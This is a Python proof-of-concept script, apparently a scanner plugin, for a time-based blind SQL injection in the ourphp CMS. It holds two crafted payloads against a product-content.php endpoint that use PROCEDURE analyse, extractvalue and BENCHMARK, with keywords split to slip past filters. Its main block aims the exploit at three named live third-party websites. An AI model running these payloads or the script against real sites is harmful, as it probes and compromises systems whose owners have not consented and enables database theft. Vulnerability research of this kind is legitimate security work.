#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :   ourphp最新版sql盲注
Author    :  a
mail      :  a@lcx.cc
 
refer     :WooYun-2015-149584

ENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。
"""
import urlparse
import time

def assign(service, arg):
    if service == 'ourphp':
        return True, arg

def audit(arg):

   
  
    start_time1=time.time()
    payload ='function/plugs/Comment/product-content.php?id=1&row=10%20PROCEDURE%20analyse((sel||ect%20extractvalue(ran||d(),concat(0x3a,(IF(SUBSTRING(version(),1,1)%20LIKE%205,%20BENCHMARK(2,SHA1(1)),1))))),1)'
    url=arg + payload
    code1, head, res, errcode, _ = curl.curl2(url)
    true_time=time.time()-start_time1

    payload ='function/plugs/Comment/product-content.php?id=1&row=10%20PROCEDURE%20analyse((sel||ect%20extractvalue(ran||d(),concat(0x3a,(IF(SUBSTRING(version(),1,1)%20LIKE%205,%20BENCHMARK(10000000,SHA1(1)),1))))),1)'
    url = arg + payload  
    start_time2=time.time()
    code2, head, res, errcode, _ = curl.curl2(url)
    flase_time=time.time()-start_time2
    #print flase_time ,true_time
    if code1==200 and code2==200 and flase_time/true_time > 10 :
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ourphp', 'http://www.aimeielien.com/')[1])
    audit(assign('ourphp', 'http://www.ruochanjj.com/')[1])
    audit(assign('ourphp', 'http://www.dxi333.com/')[1])